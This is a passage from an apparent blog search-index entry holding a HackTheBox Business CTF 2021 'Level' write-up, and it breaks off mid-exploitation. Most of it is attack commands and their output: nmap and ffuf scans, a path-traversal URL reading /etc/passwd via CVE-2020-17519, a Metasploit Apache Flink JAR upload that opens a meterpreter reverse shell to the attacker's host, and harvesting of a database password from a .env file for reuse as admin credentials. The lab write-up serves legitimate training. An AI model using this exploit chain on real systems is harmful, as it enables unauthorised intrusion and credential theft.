        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Level (Fullpwn)",
        "excerpt":"Level is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519, HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387, MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution ,CVE-2021-27928   Network Scanning  Let’s find all open ports on the target machine using nmap sudo nmap -sC -sV -T4 -A -p- --vv 10.129.85.134 -oN nmap/nmap_level  # Nmap 7.91 scan initiated Mon Jul 26 20:36:29 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_level 10.129.85.134 Increasing send delay for 10.129.85.134 from 0 to 5 due to 2516 out of 6289 dropped probes since last increase. Nmap scan report for 10.129.85.134 Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2021-07-26 20:36:29 WIB for 1422s Not shown: 65525 closed ports Reason: 65525 resets PORT      STATE SERVICE          REASON         VERSION 22/tcp    open  ssh              syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1FohcrXkoPYUOtmzAh5PlCU2H0+sFcGl6XXS6vX2lLJ3RD2Vd+KlcYtc2wQLjcYJhkFe793jmkogOSh0uI+fKQA9z1Ib3J0vtsIaNkXxvSMPcr54QxXgg1guaM1OQl43ePUADXnB6WqAg8QyF6Nxoa18vboOAu3a8Wn9Qf9iCpoU93d5zQj+FsBKVaDs3zuJkUBRfjsqq7rEMpxqCfkFIeUrJF9MBsQhgsEVUbo1zicWG32m49PgDbKr9yE3lPsV9K4b9ugNQ3zwWW5a1OpOs+r3AxFcu2q65N2znV3/p41ul9+fWXo9pm0jJPJ3V5gZphDkXVZEw16K2hcgQcQJUH7luaVTRpzqDxXaiK/8wChtMXEUjFQKL6snEskkRxCg+uLO6HjI19dJ7sTBUkjdMK58TM5RmK8EO1VvbCAAdlMs8G064pSFKxY/iQjp7VWuaqBUetpplESpIe6Bz+tOyTJ8ZyhkJimFG80iHoKWYI2TOa5FdlXod1NvTIkCLD2U= |   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+SiHX7ZTaXWFgBUKSVlFmMYtqF7Ihjfdc51aEdxFdB3xnRWVYSJd2JhOX1k/9V62eZMhR/4Lc8pJWQJHdSA/c= |   256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXLlJgua8pjAw5NcWgGDwXoASfUOqUlpeQxd66seKyT 80/tcp    open  ssl/http?        syn-ack ttl 63 | http-methods:  |_  Supported Methods: POST 3306/tcp  open  mysql?           syn-ack ttl 63 | mysql-info:  |_  MySQL Error: Host '10.10.14.172' is not allowed to connect to this MariaDB server |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 6123/tcp  open  spark            syn-ack ttl 63 Apache Spark 8081/tcp  open  blackice-icecap? syn-ack ttl 63 | fingerprint-strings:  |   FourOhFourRequest:  |     HTTP/1.1 404 Not Found |     Content-Type: application/json; charset=UTF-8 |     content-length: 74 |     {\"errors\":[\"Unable to load requested file /nice ports,/Trinity.txt.bak.\"]} |   GetRequest:  |     HTTP/1.1 200 OK |     Content-Type: text/html |     Date: Mon, 26 Jul 2021 14:02:04 GMT |     Expires: Mon, 26 Jul 2021 14:07:04 GMT |     Cache-Control: private, max-age=300 |     Last-Modified: Mon, 26 Jul 2021 14:02:04 GMT |     content-length: 2137 |     &lt;!-- |     Licensed to the Apache Software Foundation (ASF) under one |     more contributor license agreements. See the NOTICE file |     distributed with this work for additional information |     regarding copyright ownership. The ASF licenses this file |     under the Apache License, Version 2.0 (the |     \"License\"); you may not use this file except in compliance |     with the License. You may obtain a copy of the License at |     http://www.apache.org/licenses/LICENSE-2.0 |     Unless required by applicable law or agreed to in writing, software |     distributed under the License is distributed on an \"AS IS\" BASIS, |     WITHOUT WARRANTIES OR CONDITIONS OF |   SIPOptions:  |     HTTP/1.1 404 Not Found |     Content-Type: application/json; charset=UTF-8 |     Access-Control-Allow-Origin: * |     Connection: keep-alive |     content-length: 25 |     {\"errors\":[\"Not found.\"]} |   WWWOFFLEctrlstat:  |     HTTP/1.1 404 Not Found |     Content-Type: application/json; charset=UTF-8 |     content-length: 58 |_    {\"errors\":[\"Unable to load requested file /bad-request.\"]} |_mcafee-epo-agent: ePO Agent not found 34655/tcp open  printer          syn-ack ttl 63 39845/tcp open  spark            syn-ack ttl 63 Apache Spark 41129/tcp open  spark            syn-ack ttl 63 Apache Spark 46431/tcp open  spark            syn-ack ttl 63 Apache Spark 46613/tcp open  unknown          syn-ack ttl 63 | fingerprint-strings:  |   Kerberos:  |     Forg.apache.flink.shaded.netty4.io.netty.handler.codec.DecoderException`  |     Dorg.apache.flink.shaded.netty4.io.netty.handler.codec.CodecException |     java.lang.RuntimeException |     java.lang.Exception |     java.lang.Throwable |     5'9w |     causet |     Ljava/lang/Throwable;L |     detailMessaget |     Ljava/lang/String;[ |     stackTracet |     [Ljava/lang/StackTraceElement;L |     suppressedExceptionst |     Ljava/util/List;xpsr |     java.lang.IllegalStateException |     :Network stream corrupted: received incorrect magic number.ur |     [Ljava.lang.StackTraceElement; |     F*&lt;&lt; |     java.lang.StackTraceElementa  |     formatI |     lineNumberL |     classLoaderNameq |     declaringClassq |     fileNameq |     methodNameq |     moduleNameq |     moduleVersionq |     appt |     Jorg.apache.flink.runtime.io.network.netty.NettyMessage$NettyMessageDecodert |     NettyMe |   RPCCheck:  |     Korg.apache.flink.shaded.netty4.io.netty.handler.codec.TooLongFrameException |     Forg.apache.flink.shaded.netty4.io.netty.handler.codec.DecoderException`  |     Dorg.apache.flink.shaded.netty4.io.netty.handler.codec.CodecException |     java.lang.RuntimeException |     java.lang.Exception |     java.lang.Throwable |     5'9w |     causet |     Ljava/lang/Throwable;L |     detailMessaget |     Ljava/lang/String;[ |     stackTracet |     [Ljava/lang/StackTraceElement;L |     suppressedExceptionst |     Ljava/util/List;xpq |     @Adjusted frame length exceeds 2147483647: 2147483688 - discardedur |     [Ljava.lang.StackTraceElement; |     F*&lt;&lt; |     java.lang.StackTraceElementa  |     formatI |     lineNumberL |     classLoaderNameq |     declaringClassq |     fileNameq |     methodNameq |     moduleNameq |     moduleVersionq |     appt |_    Rorg.apache.flink.shaded.netty4.io.netty. 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8081-TCP:V=7.91%I=7%D=7/26%Time=60FEBEDD%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,93B,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/html\\r\\nD SF:ate:\\x20Mon,\\x2026\\x20Jul\\x202021\\x2014:02:04\\x20GMT\\r\\nExpires:\\x20Mon SF:,\\x2026\\x20Jul\\x202021\\x2014:07:04\\x20GMT\\r\\nCache-Control:\\x20private, SF:\\x20max-age=300\\r\\nLast-Modified:\\x20Mon,\\x2026\\x20Jul\\x202021\\x2014:02 SF::04\\x20GMT\\r\\ncontent-length:\\x202137\\r\\n\\r\\n&lt;!--\\n\\x20\\x20~\\x20License SF:d\\x20to\\x20the\\x20Apache\\x20Software\\x20Foundation\\x20\\(ASF\\)\\x20under\\ SF:x20one\\n\\x20\\x20~\\x20or\\x20more\\x20contributor\\x20license\\x20agreements SF:\\.\\x20\\x20See\\x20the\\x20NOTICE\\x20file\\n\\x20\\x20~\\x20distributed\\x20wit SF:h\\x20this\\x20work\\x20for\\x20additional\\x20information\\n\\x20\\x20~\\x20reg SF:arding\\x20copyright\\x20ownership\\.\\x20\\x20The\\x20ASF\\x20licenses\\x20thi SF:s\\x20file\\n\\x20\\x20~\\x20to\\x20you\\x20under\\x20the\\x20Apache\\x20License, SF:\\x20Version\\x202\\.0\\x20\\(the\\n\\x20\\x20~\\x20\\\"License\\\"\\);\\x20you\\x20may SF:\\x20not\\x20use\\x20this\\x20file\\x20except\\x20in\\x20compliance\\n\\x20\\x20~ SF:\\x20with\\x20the\\x20License\\.\\x20\\x20You\\x20may\\x20obtain\\x20a\\x20copy\\x SF:20of\\x20the\\x20License\\x20at\\n\\x20\\x20~\\n\\x20\\x20~\\x20\\x20\\x20\\x20\\x20h SF:ttp://www\\.apache\\.org/licenses/LICENSE-2\\.0\\n\\x20\\x20~\\n\\x20\\x20~\\x20U SF:nless\\x20required\\x20by\\x20applicable\\x20law\\x20or\\x20agreed\\x20to\\x20i SF:n\\x20writing,\\x20software\\n\\x20\\x20~\\x20distributed\\x20under\\x20the\\x20 SF:License\\x20is\\x20distributed\\x20on\\x20an\\x20\\\"AS\\x20IS\\\"\\x20BASIS,\\n\\x2 SF:0\\x20~\\x20WITHOUT\\x20WARRANTIES\\x20OR\\x20CONDITIONS\\x20OF\")%r(FourOhFou SF:rRequest,A7,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Type:\\x20appli SF:cation/json;\\x20charset=UTF-8\\r\\ncontent-length:\\x2074\\r\\n\\r\\n{\\\"errors SF:\\\":\\[\\\"Unable\\x20to\\x20load\\x20requested\\x20file\\x20/nice\\x20ports,/Tri SF:nity\\.txt\\.bak\\.\\\"\\]}\")%r(SIPOptions,AE,\"HTTP/1\\.1\\x20404\\x20Not\\x20Fou SF:nd\\r\\nContent-Type:\\x20application/json;\\x20charset=UTF-8\\r\\nAccess-Con SF:trol-Allow-Origin:\\x20\\*\\r\\nConnection:\\x20keep-alive\\r\\ncontent-length SF::\\x2025\\r\\n\\r\\n{\\\"errors\\\":\\[\\\"Not\\x20found\\.\\\"\\]}\")%r(WWWOFFLEctrlstat SF:,97,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Type:\\x20application/j SF:son;\\x20charset=UTF-8\\r\\ncontent-length:\\x2058\\r\\n\\r\\n{\\\"errors\\\":\\[\\\"U SF:nable\\x20to\\x20load\\x20requested\\x20file\\x20/bad-request\\.\\\"\\]}\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port46613-TCP:V=7.91%I=7%D=7/26%Time=60FEBEF2%P=x86_64-pc-linux-gnu%r(R SF:PCCheck,ACF,\"\\0\\0\\n\\xcf\\xba\\xdc\\x0f\\xfe\\x01\\xac\\xed\\0\\x05sr\\0Korg\\.apac SF:he\\.flink\\.shaded\\.netty4\\.io\\.netty\\.handler\\.codec\\.TooLongFrameExcep SF:tion\\xe4M\\|\\xb36\\x8e\\xac\\(\\x02\\0\\0xr\\0Forg\\.apache\\.flink\\.shaded\\.nett SF:y4\\.io\\.netty\\.handler\\.codec\\.DecoderException`\\x20\\xa4Dm\\x9d\\xf1\\xdc\\ SF:x02\\0\\0xr\\0Dorg\\.apache\\.flink\\.shaded\\.netty4\\.io\\.netty\\.handler\\.cod SF:ec\\.CodecException\\xeb\\xab\\xe0\\x82\\xf5\\x86\\xb3\\x87\\x02\\0\\0xr\\0\\x1ajava\\ SF:.lang\\.RuntimeException\\x9e_\\x06G\\n4\\x83\\xe5\\x02\\0\\0xr\\0\\x13java\\.lang\\ SF:.Exception\\xd0\\xfd\\x1f&gt;\\x1a;\\x1c\\xc4\\x02\\0\\0xr\\0\\x13java\\.lang\\.Throwab SF:le\\xd5\\xc65'9w\\xb8\\xcb\\x03\\0\\x04L\\0\\x05causet\\0\\x15Ljava/lang/Throwable SF:;L\\0\\rdetailMessaget\\0\\x12Ljava/lang/String;\\[\\0\\nstackTracet\\0\\x1e\\[Lj SF:ava/lang/StackTraceElement;L\\0\\x14suppressedExceptionst\\0\\x10Ljava/util SF:/List;xpq\\0~\\0\\nt\\0@Adjusted\\x20frame\\x20length\\x20exceeds\\x20214748364 SF:7:\\x202147483688\\x20-\\x20discardedur\\0\\x1e\\[Ljava\\.lang\\.StackTraceElem SF:ent;\\x02F\\*&lt;&lt;\\xfd\\\"9\\x02\\0\\0xp\\0\\0\\0\\x16sr\\0\\x1bjava\\.lang\\.StackTraceE SF:lementa\\t\\xc5\\x9a&amp;6\\xdd\\x85\\x02\\0\\x08B\\0\\x06formatI\\0\\nlineNumberL\\0\\x0 SF:fclassLoaderNameq\\0~\\0\\x07L\\0\\x0edeclaringClassq\\0~\\0\\x07L\\0\\x08fileNam SF:eq\\0~\\0\\x07L\\0\\nmethodNameq\\0~\\0\\x07L\\0\\nmoduleNameq\\0~\\0\\x07L\\0\\rmodul SF:eVersionq\\0~\\0\\x07xp\\x01\\0\\0\\x02\\x01t\\0\\x03appt\\0Rorg\\.apache\\.flink\\.s SF:haded\\.netty4\\.io\\.netty\\.\")%r(Kerberos,C60,\"\\0\\0\\x0c`\\xba\\xdc\\x0f\\xfe\\ SF:x01\\xac\\xed\\0\\x05sr\\0Forg\\.apache\\.flink\\.shaded\\.netty4\\.io\\.netty\\.ha SF:ndler\\.codec\\.DecoderException`\\x20\\xa4Dm\\x9d\\xf1\\xdc\\x02\\0\\0xr\\0Dorg\\. SF:apache\\.flink\\.shaded\\.netty4\\.io\\.netty\\.handler\\.codec\\.CodecExceptio SF:n\\xeb\\xab\\xe0\\x82\\xf5\\x86\\xb3\\x87\\x02\\0\\0xr\\0\\x1ajava\\.lang\\.RuntimeExc SF:eption\\x9e_\\x06G\\n4\\x83\\xe5\\x02\\0\\0xr\\0\\x13java\\.lang\\.Exception\\xd0\\xf SF:d\\x1f&gt;\\x1a;\\x1c\\xc4\\x02\\0\\0xr\\0\\x13java\\.lang\\.Throwable\\xd5\\xc65'9w\\xb SF:8\\xcb\\x03\\0\\x04L\\0\\x05causet\\0\\x15Ljava/lang/Throwable;L\\0\\rdetailMessa SF:get\\0\\x12Ljava/lang/String;\\[\\0\\nstackTracet\\0\\x1e\\[Ljava/lang/StackTra SF:ceElement;L\\0\\x14suppressedExceptionst\\0\\x10Ljava/util/List;xpsr\\0\\x1fj SF:ava\\.lang\\.IllegalStateException\\xe6WU\\xe6\\x9aF\\xf2H\\x02\\0\\0xq\\0~\\0\\x02 SF:q\\0~\\0\\x0bt\\0:Network\\x20stream\\x20corrupted:\\x20received\\x20incorrect\\ SF:x20magic\\x20number\\.ur\\0\\x1e\\[Ljava\\.lang\\.StackTraceElement;\\x02F\\*&lt;&lt;\\ SF:xfd\\\"9\\x02\\0\\0xp\\0\\0\\0\\x12sr\\0\\x1bjava\\.lang\\.StackTraceElementa\\t\\xc5\\ SF:x9a&amp;6\\xdd\\x85\\x02\\0\\x08B\\0\\x06formatI\\0\\nlineNumberL\\0\\x0fclassLoaderNa SF:meq\\0~\\0\\x06L\\0\\x0edeclaringClassq\\0~\\0\\x06L\\0\\x08fileNameq\\0~\\0\\x06L\\0 SF:\\nmethodNameq\\0~\\0\\x06L\\0\\nmoduleNameq\\0~\\0\\x06L\\0\\rmoduleVersionq\\0~\\0 SF:\\x06xp\\x01\\0\\0\\0\\xdft\\0\\x03appt\\0Jorg\\.apache\\.flink\\.runtime\\.io\\.netw SF:ork\\.netty\\.NettyMessage\\$NettyMessageDecodert\\0\\x11NettyMe\"); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/26%OT=22%CT=1%CU=42064%PV=Y%DS=2%DC=T%G=Y%TM=60FEBFE OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ( OS:SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3= OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7 OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF= OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=% OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0 OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  Uptime guess: 17.110 days (since Fri Jul  9 18:22:14 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 995/tcp) HOP RTT       ADDRESS 1   435.14 ms 10.10.14.1 2   435.18 ms 10.129.85.134  Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 26 21:00:11 2021 -- 1 IP address (1 host up) scanned in 1422.34 seconds   Enumeration  After we have results from nmap, we need to enumerate all open ports. In this case we found some ports such as:     Port 80 = Apache 2.4.1   Port 3306 = mysql/MariaDB   Port 8081 = Apache Flink Version: 1.11.2   Port 34655 = printer   Port 6123, 39845, 41129, 46431 = Apache Spark   Port 46613 = unknown   Port 80   Port 80 run web server technology Apache 2.4.1. The front page website    enumerate directory/path using ffuf  $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.134/FUZZ -mc 200,301,302 -e .php.,txt.,html          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v1.3.0-git ________________________________________________   :: Method           : GET  :: URL              : http://10.129.172.157/FUZZ  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  :: Extensions       : .php. txt. html   :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200,301,302 ________________________________________________  search                  [Status: 302, Size: 330, Words: 60, Lines: 12] resources               [Status: 301, Size: 320, Words: 20, Lines: 10] themes                  [Status: 301, Size: 317, Words: 20, Lines: 10] admin                   [Status: 302, Size: 378, Words: 60, Lines: 12] start                   [Status: 200, Size: 16965, Words: 1826, Lines: 3] redirect                [Status: 302, Size: 366, Words: 60, Lines: 12] storage                 [Status: 301, Size: 318, Words: 20, Lines: 10] plugins                 [Status: 301, Size: 318, Words: 20, Lines: 10] database                [Status: 301, Size: 319, Words: 20, Lines: 10] language                [Status: 302, Size: 330, Words: 60, Lines: 12] app                     [Status: 301, Size: 314, Words: 20, Lines: 10] logout                  [Status: 302, Size: 330, Words: 60, Lines: 12] vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10]   go to /admin page    We don’t have any informations about HorizontCMS from searchploit, and we found from HorizontCMS 1.0.0-beta Shell Upload, and HorizontCMS Arbitrary PHP File Upload, but exploit need creds.   Port 8081   Port 8081 run web server technology Apache Flink Version: 1.11.2.    Let’s enumerate Apache Flink Version: 1.11.2 using searchploit  $ searchsploit 'Apache Flink' -------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                  |  Path -------------------------------------------------------------------------------- --------------------------------- Apache Flink 1.11.0 - Unauthenticated Arbitrary File Read (Metasploit)          | java/webapps/49398.rb Apache Flink 1.9.x - File Upload RCE (Unauthenticated)                          | java/webapps/48978.py -------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results  or we also have from google     CVE-2020-17519 Apache Flink   Apache Flink RESTful API Arbitrary File Read   Apache Flink RESTful API Arbitrary File Read   Let’s try LFI http://10.129.85.134:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd    Gaining Access   Apache Flink 1.11.0 - Unauthenticated Arbitrary File Read (Metasploit) run metasploit -q  $ msfconsole -q msf6 &gt; search 'Apache Flink'  Matching Modules ================     #  Name                                                      Disclosure Date  Rank       Check  Description    -  ----                                                      ---------------  ----       -----  -----------    0  exploit/multi/http/apache_flink_jar_upload_exec           2019-11-13       excellent  Yes    Apache Flink JAR Upload Java Code Execution    1  auxiliary/scanner/http/apache_flink_jobmanager_traversal  2021-01-05       normal     Yes    Apache Flink JobManager Traversal   Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_flink_jobmanager_traversal                                                                                                    msf6 &gt;   Let’s set our metasploit like this  [SNIP] msf6 exploit(multi/http/apache_flink_jar_upload_exec) &gt; options   Module options (exploit/multi/http/apache_flink_jar_upload_exec):     Name     Current Setting  Required  Description    ----     ---------------  --------  -----------    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS   10.129.85.134    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'fil                                        e:&lt;path&gt;'    RPORT    8081             yes       The target port (TCP)    SSL      false            no        Negotiate SSL/TLS for outgoing connections    VHOST                     no        HTTP server virtual host   Payload options (java/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  tun0             yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic   msf6 &gt; use exploit/multi/http/apache_flink_jar_upload_exec [*] No payload configured, defaulting to java/meterpreter/reverse_tcp  type run  [SNIP] msf6 exploit(multi/http/apache_flink_jar_upload_exec) &gt; run  [*] Started reverse TCP handler on 10.10.14.172:4444  [*] Running automatic check (\"set AutoCheck false\" to disable) [+] The target appears to be vulnerable. Apache Flink version 1.11.2. [*] Uploading JAR payload 'CphzzocTjEkT.jar' (5265 bytes) ... [*] Retrieving list of avialable JAR files ... [+] Found uploaded JAR file 'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar' [*] Executing JAR payload 'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar' entry class 'metasploit.Payload' ... [*] Sending stage (58060 bytes) to 10.129.85.134 [*] Meterpreter session 1 opened (10.10.14.172:4444 -&gt; 10.129.85.134:48548) at 2021-07-26 21:53:11 +0700 [*] Removing JAR file 'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar' ...  meterpreter &gt; shell Process 1 created. Channel 1 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false albert:x:1000:1000:,,,:/home/albert:/bin/bash dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:116:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin rtkit:x:117:123:RealtimeKit,,,:/proc:/usr/sbin/nologin geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin pulse:x:119:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin saned:x:120:128::/var/lib/saned:/usr/sbin/nologin colord:x:121:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin gdm:x:122:130:Gnome Display Manager:/var/lib/gdm3:/bin/false  From /etc/passwd we navigate to /home/albert we need as albert  cd /home/albert ls -la total 28 drwxr-xr-x 3 albert albert 4096 Jun 24 05:18 . drwxr-xr-x 3 root   root   4096 Jun 16 10:05 .. lrwxrwxrwx 1 albert albert    9 Jun 16 08:41 .bash_history -&gt; /dev/null -rw-r--r-- 1 albert albert  220 Jun 16 08:41 .bash_logout -rw-r--r-- 1 albert albert 3797 Jun 16 08:41 .bashrc -rw-r--r-- 1 albert albert  807 Jun 16 08:41 .profile drwx------ 2 albert albert 4096 Jun 16 09:58 .ssh -r-------- 1 albert albert   29 Jun 24 05:18 user.txt cat user.txt cat: user.txt: Permission denied   Enumerate directory /var/www/html go to /var/www/html  cd /var/www/html ls -la total 788 drwxr-xr-x 12 albert albert   4096 Jun 18 12:02 . drwxr-xr-x  4 root   root     4096 Jun 18 11:57 .. drwxr-xr-x 12 albert albert   4096 Jun 18 11:57 app -rw-r--r--  1 albert albert   1646 Jul 13  2020 artisan drwxr-xr-x  3 albert albert   4096 Jun 18 11:57 bootstrap -rw-r--r--  1 albert albert   2473 Jul 13  2020 composer.json -rw-r--r--  1 albert albert 225292 Jul 13  2020 composer.lock drwxr-xr-x  2 albert albert   4096 Jul 17 02:58 config drwxr-xr-x  5 albert albert   4096 Jun 18 11:57 database -rw-r--r--  1 albert albert    125 Jun 16 08:46 .env -rw-r--r--  1 albert albert     61 Jul 13  2020 .gitattributes -rw-r--r--  1 albert albert    288 Jul 13  2020 .gitignore -rw-r--r--  1 albert albert    534 Jul 13  2020 git-patcher.sh -rw-r--r--  1 albert albert    556 Jul 13  2020 .htaccess -rw-r--r--  1 albert albert   1776 Jul 13  2020 index.php -rw-r--r--  1 albert albert   1070 Jul 13  2020 LICENSE -rw-r--r--  1 albert albert   1147 Jul 13  2020 package.json -rw-r--r--  1 albert albert 463966 Jul 13  2020 package-lock.json -rw-r--r--  1 albert albert   1658 Jul 13  2020 phpunit.xml drwxr-xr-x  2 albert albert   4096 Jun 18 11:57 plugins -rw-r--r--  1 albert albert   2908 Jul 13  2020 README.md drwxr-xr-x  9 albert albert   4096 Jun 18 11:57 resources drwxr-xr-x  2 albert albert   4096 Jun 18 12:02 routes -rw-r--r--  1 albert albert    560 Jul 13  2020 server.php drwxr-xr-x  5 albert albert   4096 Jun 18 11:57 storage drwxr-xr-x  3 albert albert   4096 Jun 18 11:57 themes -rw-r--r--  1 albert albert    866 Jul 13  2020 .travis.yml drwxr-xr-x 46 albert albert   4096 Jun 18 12:02 vendor -rw-r--r--  1 albert albert    581 Jul 13  2020 webpack.mix.js  see the .env file  cat .env DB_HOST=127.0.0.1 DB_CONNECTION=mysql DB_USERNAME=hcms DB_PASSWORD=N&gt;2sM4^R_j&gt;g)cfe DB_DATABASE=hcms HCMS_ADMIN_PREFIX=admin  Now we have HorizontCMS creds is admin:N&gt;2sM4^R_j&gt;g)cfe.Let’s exit from the metasploit, and change to exploit/multi/http/horizontcms_upload_exe  exit meterpreter &gt; background [*] Backgrounding session 1... msf6 exploit(multi/http/apache_flink_jar_upload_exec) &gt; search 'HorizontCMS'  Matching Modules ================     #  Name                                        Disclosure Date  Rank       Check  Description    -  ----                                        ---------------  ----       -----  -----------    0  exploit/multi/http/horizontcms_upload_exec  